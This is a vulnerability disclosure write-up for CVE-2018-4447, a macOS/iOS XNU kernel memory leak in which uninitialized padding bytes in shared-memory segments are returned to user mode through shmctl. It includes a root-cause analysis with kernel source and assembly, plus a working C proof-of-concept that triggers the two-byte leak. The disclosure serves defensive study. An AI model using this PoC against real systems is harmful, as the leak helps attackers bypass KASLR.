---
layout: default
author: juwei lin
date: 2018-09-25 15:47:00 +0800
---

# CVE-2018-4447 Apple XNU kernel memory leak vulnerability 

## Overview
This vulnerability exists in BSD share memory module(shm*). shm allocates memory during module initialization without memset, which leaves some fields of the memory uninitialized. And one shm api can read the allocated memory with uninitialized fields from kernel to usermode leading to memory leak.  
With this vulnerability, attacker can disclosure some kernel memory to bypass KASLR.

## Root Cause Analysis
### 1. shm allocates memory without memset

function shmget returns an allocated segment with most fields filled.
```
int
shmget(struct proc *p, struct shmget_args *uap, int32_t *retval)
{
	int segnum, mode, error;
	int shmget_ret = 0;

	/* Auditing is actually done in shmget_allocate_segment() */

	SYSV_SHM_SUBSYS_LOCK();

	if ((shmget_ret = shminit())) {     ---------------------(1.a)
		goto shmget_out;
	}

	mode = uap->shmflg & ACCESSPERMS;
	if (uap->key != IPC_PRIVATE) {
	again:
		segnum = shm_find_segment_by_key(uap->key);
		if (segnum >= 0) {
			error = shmget_existing(uap, mode, segnum, retval);
			if (error == EAGAIN)
				goto again;
			shmget_ret = error;
			goto shmget_out;
		}
		if ((uap->shmflg & IPC_CREAT) == 0) {
			shmget_ret = ENOENT;
			goto shmget_out;
		}
	}
	shmget_ret = shmget_allocate_segment(p, uap, mode, retval); ---(1.b)
shmget_out:
	SYSV_SHM_SUBSYS_UNLOCK();
	return shmget_ret;
}
```
At (1.a), shminit allocates memory at its first time. At (1.b), shmget_allocate_segment fills most fields of the memory.

See shminit firstly.

```C
int
shminit(void)
{
	size_t sz;
	int i;

	if (!shm_inited) {
		/*
		 * we store internally 64 bit, since if we didn't, we would
		 * be unable to represent a segment size in excess of 32 bits
		 * with the (struct shmid_ds)->shm_segsz field; also, POSIX
		 * dictates this filed be a size_t, which is 64 bits when
		 * running 64 bit binaries.
		 */
		if (os_mul_overflow(shminfo.shmmni, sizeof(struct shmid_kernel), &sz)) {
			return ENOMEM;
		}

		MALLOC(shmsegs, struct shmid_kernel *, sz, M_SHM, M_WAITOK);    -----------(2.a)
		if (shmsegs == NULL) {
			return ENOMEM;
		}
		for (i = 0; i < shminfo.shmmni; i++) {
			shmsegs[i].u.shm_perm.mode = SHMSEG_FREE;
			shmsegs[i].u.shm_perm._seq = 0;
#if CONFIG_MACF
			mac_sysvshm_label_init(&shmsegs[i]);
#endif
		}
		shm_last_free = 0;
		shm_nused = 0;
		shm_committed = 0;
		shm_inited = 1;
	}

	return 0;
}
```
At location (2.a), `shmsegs` is allocated without initialization, it contains bytes used by its previous owner.  

### 2. not all fields of the allocated memory are initialized  
After shmsegs is allocated, shmget_allocate_segment(1.b) is called. shmget_allocate_segment is used to fill fields of selected shmseg from shmsegs. The vulnerability exists in this function since it doesn't fill all bytes of the shmseg.

```C
static int
shmget_allocate_segment(struct proc *p, struct shmget_args *uap, int mode,
	int *retval)
{
	int i, segnum, shmid;
	kauth_cred_t cred = kauth_cred_get();
	struct shmid_kernel *shmseg;
	struct shm_handle *shm_handle;
	kern_return_t kret;
	mach_vm_size_t total_size, size, alloc_size;
	void * mem_object;
	struct shm_handle *shm_handle_next, **shm_handle_next_p;

    ...

    shmseg = &shmsegs[segnum];

    ...

    shmseg->u.shm_segsz = uap->size;
	shmseg->u.shm_cpid = p->p_pid;
	shmseg->u.shm_lpid = shmseg->u.shm_nattch = 0; ---------(3.a)
	shmseg->u.shm_atime = shmseg->u.shm_dtime = 0;

    ...

}
```

At (3.a), it assigns 0 to shm_nattch as a word.  
```
mov     [r8], ax
mov     rax, [r13+8]
mov     [rbx+r15+18h], rax ; shm_segsz
mov     rax, [rbp-80h]
mov     eax, [rax+10h]
mov     [rbx+r15+24h], eax ; shm_cpid
mov     word ptr [rbx+r15+28h], 0 ; shm_nattch, 0x28-0x2a
mov     dword ptr [rbx+r15+20h], 0 ; shm_lpid
mov     qword ptr [rbx+r15+34h], 0 ; shm_dtime
mov     qword ptr [rbx+r15+2Ch], 0 ; shm_atime
mov     rsi, [rbp-30h]
mov     r13, r8
call    _mac_sysvshm_label_associate
```
You can refer to the above assembly codes of function shmget_allocate_segment that it doesn't fill field at offset 0x2a. Actually offset `0x2a` of the memory(shmseg) is padding of structure `user_shmid_ds`:  
```C
#pragma pack(4)

struct user_shmid_ds {
	struct ipc_perm shm_perm;	/* operation permission structure */
	user_size_t	shm_segsz;	/* size of segment in bytes */
	pid_t		shm_lpid;	/* PID of last shared memory op */
	pid_t		shm_cpid;	/* PID of creator */
	short		shm_nattch; //@panicaII: offset 0x28, len: 2
	user_time_t	shm_atime;	//@panicalII: offset 0x2c
	user_time_t	shm_dtime;	/* time of last shmdt() */
	user_time_t	shm_ctime;	/* time of last change by shmctl() */
	user_addr_t	shm_internal;	/* reserved for kernel use */
};

struct user32_shmid_ds {
	struct ipc_perm shm_perm;	/* operation permission structure */
	uint32_t	shm_segsz;	/* size of segment in bytes */
	pid_t		shm_lpid;	/* PID of last shared memory op */
	pid_t		shm_cpid;	/* PID of creator */
	short		shm_nattch;	/* number of current attaches */
	uint32_t		shm_atime;	/* time of last shmat() */
	uint32_t		shm_dtime;	/* time of last shmdt() */
	uint32_t		shm_ctime;	/* time of last change by shmctl() */
	user32_addr_t	shm_internal;	/* reserved for kernel use */
};

#pragma pack()
```
   
### 3. read the uninitialized fields back to user-mode  
function shmctl with cmd IPC_STAT can retrieve shmseg back to user-mode buffer.  
```C
int
shmctl(__unused struct proc *p, struct shmctl_args *uap, int32_t *retval)
{
    ...

	switch (uap->cmd) {
	case IPC_STAT:
		error = ipcperm(cred, &shmseg->u.shm_perm, IPC_R);
		if (error) {
			shmctl_ret = error;
			goto shmctl_out;
		}

		if (IS_64BIT_PROCESS(p)) {
			struct user_shmid_ds shmid_ds;
			memcpy(&shmid_ds, &shmseg->u, sizeof(struct user_shmid_ds));
			
			/* Clear kernel reserved pointer before copying to user space */
			shmid_ds.shm_internal = USER_ADDR_NULL;
			
			error = copyout(&shmid_ds, uap->buf, sizeof(shmid_ds));  -----------(4.a)
		} else {
			struct user32_shmid_ds shmid_ds32 = {};
			shmid_ds_64to32(&shmseg->u, &shmid_ds32);
			
			/* Clear kernel reserved pointer before copying to user space */
			shmid_ds32.shm_internal = (user32_addr_t)0;
			
			error = copyout(&shmid_ds32, uap->buf, sizeof(shmid_ds32));
		}
		if (error) {
			shmctl_ret = error;
			goto shmctl_out;
		}
		break;

        ...    
}
```
At (4.a), shmctl copyout the shmseg back to user supplied buffer. The following is an example of the leak:
```
panicall-mbp:share panicall$ ./vuln_poc/shmctl_leak
id: 65536
iret: 0
f5 01 00 00 14 00 00 00 f5 01 00 00 14 00 00 00
77 09 01 00 00 00 00 00 10 00 00 00 00 00 00 00
00 00 00 00 5f 60 00 00 00 00 de de 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 8d 39 aa 5b
00 00 00 00 00 00 00 00 00 00 00 00
```
At offset 0x2a, the word is 0xdede which is set by my kernel memory sanitizer. 0xdede indicates that the word length memory is not initialized and it may contain senstive information left by last owner.

## PoC Code

```C
#include <iostream>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/shm.h>

int print_test()
{
    struct shmid_ds buffer;
    memset(&buffer, 0, sizeof(buffer));
    
    int id = shmget(0, 0x10, 0x777);
    printf("id: %d\n", id);
    
    int iret = shmctl(id, 2, &buffer);
    printf("iret: %d\n", iret);
    
    uint8_t *pp = (uint8_t*)&buffer;
    if(iret == 0) {
        for (int i = 0; i < sizeof(buffer); i++) {
            printf("%02x", pp[i]);
            if (i % 16 == 15)
                printf("\n");
            else
                printf(" ");
        }
    }
    printf("\n");
    
    return iret;
}

int main(int argc, const char * argv[]) {
    // insert code here...
    print_test();
    
    
    return 0;
}
```

## Q & A
### How did you find this vulnerability?
by fuzzing.

### Can you identify exploitability?
This is a memory leak vulnerability. It can leak 2 bytes-long heap memory. Attacker can craft memory and use this vulnerability to leak 2 bytes of the crafted memory to help bypass kaslr.

### Can you identify root cause?
Yes, see the root cause analysis.

### Vulnerable software and hardware
macOS 10.14 and all before  
iOS 12.0 and all before

  [Back Home]({{site.url}}{{site.baseurl}})